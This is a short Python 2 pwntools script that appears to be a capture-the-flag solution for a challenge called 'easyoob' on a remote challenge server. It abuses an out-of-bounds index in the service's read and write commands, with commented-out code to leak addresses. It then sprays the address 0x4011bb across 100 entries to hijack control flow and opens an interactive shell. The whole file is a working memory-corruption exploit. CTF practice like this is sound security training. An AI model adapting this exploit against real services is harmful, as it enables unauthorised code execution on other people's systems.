#!/usr/bin/python2
from pwn import *
import os

#sh = process('./easyoob')
sh = remote('challs.nusgreyhats.org', 10524)

def write_entry(pos, uid, score):
	payload = '2 {} {} {}'.format(pos, uid, score)
	sh.sendline(payload)
	return sh.recv()

def read_entry(pos):
	payload = '1 {}'.format(pos)
	sh.sendline(payload)
	return sh.recv()

def parse_leaks(leak):
	chef = leak.split()
	chef[1] = chef[1][1:-1]
	addr = str(hex(int(chef[2])))
	addr += str(hex(int(chef[1])))[2:]
	return addr


# addrs = []

# print sh.recv()
# for i in range(25, 50):
# 	print i
# 	chef = read_entry(i)
# 	addrs.append(parse_leaks(chef))

# print addrs
# to_overwrite = raw_input("enter some input: ")

for i in range(100):
	print write_entry(i, int(0x4011bb), 0)

#gdb.attach(sh)
sh.sendline('3')
sh.interactive()